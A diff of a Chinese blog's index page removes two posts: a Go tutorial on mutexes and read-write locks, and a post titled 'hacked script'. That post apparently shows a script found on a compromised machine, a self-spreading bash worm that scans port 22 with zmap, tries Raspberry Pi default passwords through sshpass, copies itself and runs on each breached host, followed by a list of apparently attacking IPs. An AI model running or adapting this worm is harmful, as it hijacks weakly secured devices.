-rf nohup.out</span><br><span class="line">sleep 3</span><br><span class="line">rm -rf /tmp/<span class="variable">$BOT</span></span><br><span class="line"></span><br><span class="line">NAME=`mktemp -u <span class="string">&#x27;XXXXXXXX&#x27;</span>`</span><br><span class="line"></span><br><span class="line">date &gt; /tmp/.s</span><br><span class="line"></span><br><span class="line">apt-get update -y --force-yes</span><br><span class="line">apt-get install zmap sshpass -y --force-yes</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> [ <span class="literal">true</span> ]; <span class="keyword">do</span></span><br><span class="line">	FILE=`mktemp`</span><br><span class="line">	zmap -p 22 -o <span class="variable">$FILE</span> -n 100000</span><br><span class="line">	killall ssh scp</span><br><span class="line">	<span class="keyword">for</span> IP <span class="keyword">in</span> `cat <span class="variable">$FILE</span>`</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">		sshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no <span class="variable">$MYSELF</span> pi@<span class="variable">$IP</span>:/tmp/<span class="variable">$NAME</span>  &amp;&amp; <span class="built_in">echo</span> <span class="variable">$IP</span> &gt;&gt; /opt/.r &amp;&amp; sshpass -praspberry ssh pi@<span class="variable">$IP</span> -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no <span class="string">&quot;cd /tmp &amp;&amp; chmod +x <span class="variable">$NAME</span> &amp;&amp; bash -c ./<span class="variable">$NAME</span>&quot;</span> &amp;</span><br><span class="line">		sshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no <span class="variable">$MYSELF</span> pi@<span class="variable">$IP</span>:/tmp/<span class="variable">$NAME</span>  &amp;&amp; <span class="built_in">echo</span> <span class="variable">$IP</span> &gt;&gt; /opt/.r &amp;&amp; sshpass -praspberryraspberry993311 ssh pi@<span class="variable">$IP</span> -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no <span class="string">&quot;cd /tmp &amp;&amp; chmod +x <span class="variable">$NAME</span> &amp;&amp; bash -c ./<span class="variable">$NAME</span>&quot;</span> &amp;</span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line">	rm -rf <span class="variable">$FILE</span></span><br><span class="line">	sleep 10</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>ip<br>18.132.196.152<br>102.37.42.55<br>46.30.234.60<br>46.30.234.60<br>79.98.159.7<br>79.98.159.7<br>54.153.54.230<br>81.151.94.19<br>138.68.91.250<br>138.68.91.250<br>35.200.133.234<br>35.200.133.234<br>68.169.61.66<br>77.240.100.215<br>77.240.100.215<br>54.92.204.47<br>206.189.139.95<br>206.189.139.95<br>54.233.114.207<br>198.199.120.102<br>198.199.120.102<br>81.196.205.195<br>81.196.205.195<br>13.52.183.6<br>68.183.228.248<br>68.183.228.248<br>81.196.205.210<br>81.196.205.210<br>134.209.89.233<br>134.209.89.233<br>153.196.173.38<br>153.196.173.38<br>167.172.119.82</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/28/yuque/%E8%A2%AB%E9%BB%91%E8%84%9A%E6%9C%AC/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-yuque/go 锁的使用介绍" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/13/yuque/go%20%E9%94%81%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/">go 锁的使用介绍</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/13/yuque/go%20%E9%94%81%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/" class="archive-article-date">
-  	<time datetime="2020-09-13T15:54:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-13</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="锁的介绍"><a href="#锁的介绍" class="headerlink" title="锁的介绍"></a>锁的介绍</h1><h2 id="1-互斥锁"><a href="#1-互斥锁" class="headerlink" title="1 互斥锁"></a>1 互斥锁</h2><p>传统并发程序对共享资源进行访问控制的主要手段，由标准库代码包中 sync 中的 Mutex 结构体表示。</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Mutex  是互斥锁， 零值是解锁的互斥锁， 首次使用后不得赋值互斥锁。</span></span><br><span class="line"><span class="keyword">type</span> Mutex <span class="keyword">struct</span> &#123;</span><br><span class="line">   state <span class="keyword">int32</span></span><br><span class="line">   sema  <span class="keyword">uint32</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="sync-Mutex-类型只有两个公开的指针方法"><a href="#sync-Mutex-类型只有两个公开的指针方法" class="headerlink" title="sync.Mutex 类型只有两个公开的指针方法"></a>sync.Mutex 类型只有两个公开的指针方法</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Locker表示可以锁定和解锁的对象。</span></span><br><span class="line"><span class="keyword">type</span> Locker <span class="keyword">interface</span> &#123;</span><br><span class="line">   Lock()</span><br><span class="line">   Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//锁定当前的互斥量</span></span><br><span class="line"><span class="comment">//如果锁已被使用，则调用goroutine</span></span><br><span class="line"><span class="comment">//阻塞直到互斥锁可用。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *Mutex)</span> <span class="title">Lock</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//对当前互斥量进行解锁</span></span><br><span class="line"><span class="comment">//如果在进入解锁时未锁定m，则为运行时错误。</span></span><br><span class="line"><span class="comment">//锁定的互斥锁与特定的goroutine无关。</span></span><br><span class="line"><span class="comment">//允许一个goroutine锁定Mutex然后安排另一个goroutine来解锁它。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *Mutex)</span> <span class="title">Unlock</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
-
-<h3 id="声明一个互斥锁："><a href="#声明一个互斥锁：" class="headerlink" title="声明一个互斥锁："></a>声明一个互斥锁：</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mutex sync.Mutex</span><br></pre></td></tr></table></figure>
-
-<p>不像 C 或 Java 的锁类工具，我们可能会犯一个错误：忘记及时解开已被锁住的锁，从而导致流程异常。但 Go 由于存在 defer，所以此类问题出现的概率极低。关于 defer 解锁的方式如下：</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mutex sync.Mutex</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Write</span><span class="params">()</span></span>  &#123;</span><br><span class="line">   mutex.Lock()</span><br><span class="line">   <span class="keyword">defer</span> mutex.Unlock()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果对一个已经上锁的对象再次上锁，那么就会导致该锁定操作被阻塞，直到该互斥锁回到被解锁状态</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">   <span class="keyword">var</span> mutex sync.Mutex</span><br><span class="line">   fmt.Println(<span class="string">&quot;start lock main&quot;</span>)</span><br><span class="line">   mutex.Lock()</span><br><span class="line">   fmt.Println(<span class="string">&quot;get locked main&quot;</span>)</span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">1</span>;i&lt;=<span class="number">3</span> ;i++  &#123;</span><br><span class="line">      <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">         fmt.Println(<span class="string">&quot;start lock &quot;</span>,i)</span><br><span class="line">         mutex.Lock()</span><br><span class="line">         fmt.Println(<span class="string">&quot;get locked &quot;</span>,i)</span><br><span class="line">      &#125;(i)</span><br><span class="line">   &#125;</span><br><span class="line">   time.Sleep(time.Second)</span><br><span class="line">   fmt.Println(<span class="string">&quot;Unlock the lock main&quot;</span>)</span><br><span class="line">   mutex.Unlock()</span><br><span class="line">   fmt.Println(<span class="string">&quot;get unlocked main&quot;</span>)</span><br><span class="line">   time.Sleep(time.Second)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>上面的示例中，我们在 for 循环之前开始加锁，然后在每一次循环中创建一个协程，并对其加锁，但是由于之前已经加锁了，所以这个 for 循环中的加锁会陷入阻塞直到 main 中的锁被解锁， time.Sleep(time.Second) 是为了能让系统有足够的时间运行 for 循环，输出结果如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">start lock main</span><br><span class="line">get locked main</span><br><span class="line">start lock  3</span><br><span class="line">start lock  1</span><br><span class="line">start lock  2</span><br><span class="line">Unlock the lock main</span><br><span class="line">get unlocked main</span><br><span class="line">get locked  3</span><br></pre></td></tr></table></figure>
-
-<p>最终在 main 解锁后，三个协程会重新抢夺互斥锁权，最终协程 3 获胜。<br>互斥锁锁定操作的逆操作并不会导致协程阻塞，但是有可能导致引发一个无法恢复的运行时的 panic，比如对一个未锁定的互斥锁进行解锁时就会发生 panic。避免这种情况的最有效方式就是使用 defer。<br>我们知道如果遇到 panic，可以使用 recover 方法进行恢复，但是如果对重复解锁互斥锁引发的 panic 却是徒劳的（Go 1.8 及以后）。</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">   <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">      fmt.Println(<span class="string">&quot;Try to recover the panic&quot;</span>)</span><br><span class="line">      <span class="keyword">if</span> p := <span class="built_in">recover</span>();p!=<span class="literal">nil</span>&#123;</span><br><span class="line">         fmt.Println(<span class="string">&quot;recover the panic : &quot;</span>,p)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;()</span><br><span class="line">   <span class="keyword">var</span> mutex sync.Mutex</span><br><span class="line">   fmt.Println(<span class="string">&quot;start lock&quot;</span>)</span><br><span class="line">   mutex.Lock()</span><br><span class="line">   fmt.Println(<span class="string">&quot;get locked&quot;</span>)</span><br><span class="line">   fmt.Println(<span class="string">&quot;unlock lock&quot;</span>)</span><br><span class="line">   mutex.Unlock()</span><br><span class="line">   fmt.Println(<span class="string">&quot;lock is unlocked&quot;</span>)</span><br><span class="line">   fmt.Println(<span class="string">&quot;unlock lock again&quot;</span>)</span><br><span class="line">   mutex.Unlock()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>以上代码试图对重复解锁引发的 panic 进行 recover，但是我们发现操作失败，输出结果：</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">start lock</span><br><span class="line">get locked</span><br><span class="line">unlock lock</span><br><span class="line">lock is unlocked</span><br><span class="line">unlock lock again</span><br><span class="line">fatal error: sync: unlock of unlocked mutex</span><br><span class="line"></span><br><span class="line">goroutine <span class="number">1</span> [running]:</span><br><span class="line">runtime.throw(<span class="number">0x4c17d4</span>, <span class="number">0x1e</span>)</span><br><span class="line">	/usr/local/<span class="keyword">go</span>-faketime/src/runtime/<span class="built_in">panic</span>.<span class="keyword">go</span>:<span class="number">1116</span> +<span class="number">0x72</span> fp=<span class="number">0xc000054e88</span> sp=<span class="number">0xc000054e58</span> pc=<span class="number">0x432072</span></span><br><span class="line">sync.throw(<span class="number">0x4c17d4</span>, <span class="number">0x1e</span>)</span><br><span class="line">	/usr/local/<span class="keyword">go</span>-faketime/src/runtime/<span class="built_in">panic</span>.<span class="keyword">go</span>:<span class="number">1102</span> +<span class="number">0x35</span> fp=<span class="number">0xc000054ea8</span> sp=<span class="number">0xc000054e88</span> pc=<span class="number">0x45f075</span></span><br><span class="line">sync.(*Mutex).unlockSlow(<span class="number">0xc000018018</span>, <span class="number">0xc0ffffffff</span>)</span><br><span class="line">	/usr/local/<span class="keyword">go</span>-faketime/src/sync/mutex.<span class="keyword">go</span>:<span class="number">196</span> +<span class="number">0xd8</span> fp=<span class="number">0xc000054ed0</span> sp=<span class="number">0xc000054ea8</span> pc=<span class="number">0x471838</span></span><br><span class="line">sync.(*Mutex).Unlock(...)</span><br><span class="line">	/usr/local/<span class="keyword">go</span>-faketime/src/sync/mutex.<span class="keyword">go</span>:<span class="number">190</span></span><br><span class="line">main.main()</span><br><span class="line">	/tmp/sandbox908680473/prog.<span class="keyword">go</span>:<span class="number">23</span> +<span class="number">0x2b9</span> fp=<span class="number">0xc000054f88</span> sp=<span class="number">0xc000054ed0</span> pc=<span class="number">0x499039</span></span><br><span class="line">runtime.main()</span><br><span class="line">	/usr/local/<span class="keyword">go</span>-faketime/src/runtime/proc.<span class="keyword">go</span>:<span class="number">204</span> +<span class="number">0x209</span> fp=<span class="number">0xc000054fe0</span> sp=<span class="number">0xc000054f88</span> pc=<span class="number">0x434889</span></span><br><span class="line">runtime.goexit()</span><br><span class="line">	/usr/local/<span class="keyword">go</span>-faketime/src/runtime/asm_amd64.s:<span class="number">1374</span> +<span class="number">0x1</span> fp=<span class="number">0xc000054fe8</span> sp=<span class="number">0xc000054fe0</span> pc=<span class="number">0x462fa1</span></span><br></pre></td></tr></table></figure>
-
-<p>虽然互斥锁可以被多个协程共享，但还是建议将对同一个互斥锁的加锁解锁操作放在同一个层次的代码中。<br><strong>2 读写锁</strong><br>读写锁是针对读写操作的互斥锁，可以分别针对读操作与写操作进行锁定和解锁操作 。<br>读写锁的访问控制规则如下：<br>① 多个写操作之间是互斥的<br>② 写操作与读操作之间也是互斥的<br>③ 多个读操作之间不是互斥的<br>在这样的控制规则下，读写锁可以大大降低性能损耗。<br>由标准库代码包中 sync 中的 RWMutex 结构体表示</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RWMutex是一个读/写互斥锁，可以由任意数量的读操作或单个写操作持有。</span></span><br><span class="line"><span class="comment">// RWMutex的零值是未锁定的互斥锁。</span></span><br><span class="line"><span class="comment">//首次使用后，不得复制RWMutex。</span></span><br><span class="line"><span class="comment">//如果goroutine持有RWMutex进行读取而另一个goroutine可能会调用Lock，那么在释放初始读锁之前，goroutine不应该期望能够获取读锁定。</span></span><br><span class="line"><span class="comment">//特别是，这种禁止递归读锁定。 这是为了确保锁最终变得可用; 阻止的锁定会阻止新读操作获取锁定。</span></span><br><span class="line"><span class="keyword">type</span> RWMutex <span class="keyword">struct</span> &#123;</span><br><span class="line">   w           Mutex  <span class="comment">//如果有待处理的写操作就持有</span></span><br><span class="line">   writerSem   <span class="keyword">uint32</span> <span class="comment">// 写操作等待读操作完成的信号量</span></span><br><span class="line">   readerSem   <span class="keyword">uint32</span> <span class="comment">//读操作等待写操作完成的信号量</span></span><br><span class="line">   readerCount <span class="keyword">int32</span>  <span class="comment">// 待处理的读操作数量</span></span><br><span class="line">   readerWait  <span class="keyword">int32</span>  <span class="comment">// number of departing readers</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>sync 中的 RWMutex 有以下几种方法：</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对读操作的锁定</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rw *RWMutex)</span> <span class="title">RLock</span><span class="params">()</span></span></span><br><span class="line"><span class="comment">//对读操作的解锁</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rw *RWMutex)</span> <span class="title">RUnlock</span><span class="params">()</span></span></span><br><span class="line"><span class="comment">//对写操作的锁定</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rw *RWMutex)</span> <span class="title">Lock</span><span class="params">()</span></span></span><br><span class="line"><span class="comment">//对写操作的解锁</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rw *RWMutex)</span> <span class="title">Unlock</span><span class="params">()</span></span></span><br><span class="line"><span class="comment">//返回一个实现了sync.Locker接口类型的值，实际上是回调rw.RLock and rw.RUnlock.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rw *RWMutex)</span> <span class="title">RLocker</span><span class="params">()</span> <span class="title">Locker</span></span></span><br></pre></td></tr></table></figure>
-
-<p>Unlock 会试图唤醒所有因欲进行读锁定而被阻塞的协程，而 RUnlock 只会在已无任何读锁定的情况下，试图唤醒一个因欲进行写锁定而被阻塞的协程。若对一个未被写锁定的读写锁进行写解锁，就会引发一个不可恢复的 panic，同理对一个未被读锁定的读写锁进行读写锁也会如此。<br>由于读写锁控制下的多个读操作之间不是互斥的，因此对于读解锁更容易被忽视。对于同一个读写锁，添加多少个读锁定，就必要有等量的读解锁，这样才能其他协程有机会进行操作。</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> rwm sync.RWMutex</span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">      <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">         fmt.Println(<span class="string">&quot;try to lock read &quot;</span>, i)</span><br><span class="line">         rwm.RLock()</span><br><span class="line">         fmt.Println(<span class="string">&quot;get locked &quot;</span>, i)</span><br><span class="line">         time.Sleep(time.Second *<span class="number">2</span>)</span><br><span class="line">         fmt.Println(<span class="string">&quot;try to unlock for reading &quot;</span>, i)</span><br><span class="line">         rwm.RUnlock()</span><br><span class="line">         fmt.Println(<span class="string">&quot;unlocked for reading &quot;</span>, i)</span><br><span class="line">      &#125;(i)</span><br><span class="line">   &#125;</span><br><span class="line">   time.Sleep(time.Millisecond * <span class="number">1000</span>)</span><br><span class="line">   fmt.Println(<span class="string">&quot;try to lock for writing&quot;</span>)</span><br><span class="line">   rwm.Lock()</span><br><span class="line">   fmt.Println(<span class="string">&quot;locked for writing&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>上面的示例创建了三个协程用于对读写锁的读锁定与读解锁操作。在 rwm.Lock()种会对 main 中协程进行写锁定，但是 for 循环中的读解锁尚未完成，因此会造成 mian 中的协程阻塞。当 for 循环中的读解锁操作都完成后就会试图唤醒 main 中阻塞的协程，main 中的写锁定才会完成。输出结果如下</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">try to lock read  <span class="number">0</span></span><br><span class="line">get locked  <span class="number">0</span></span><br><span class="line">try to lock read  <span class="number">2</span></span><br><span class="line">get locked  <span class="number">2</span></span><br><span class="line">try to lock read  <span class="number">1</span></span><br><span class="line">get locked  <span class="number">1</span></span><br><span class="line">try to lock <span class="keyword">for</span> writing</span><br><span class="line">try to unlock <span class="keyword">for</span> reading  <span class="number">0</span></span><br><span class="line">unlocked <span class="keyword">for</span> reading  <span class="number">0</span></span><br><span class="line">try to unlock <span class="keyword">for</span> reading  <span class="number">2</span></span><br><span class="line">unlocked <span class="keyword">for</span> reading  <span class="number">2</span></span><br><span class="line">try to unlock <span class="keyword">for</span> reading  <span class="number">1</span></span><br><span class="line">unlocked <span class="keyword">for</span> reading  <span class="number">1</span></span><br><span class="line">locked <span class="keyword">for</span> writing</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/13/yuque/go%20%E9%94%81%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
     </nav>
   
 
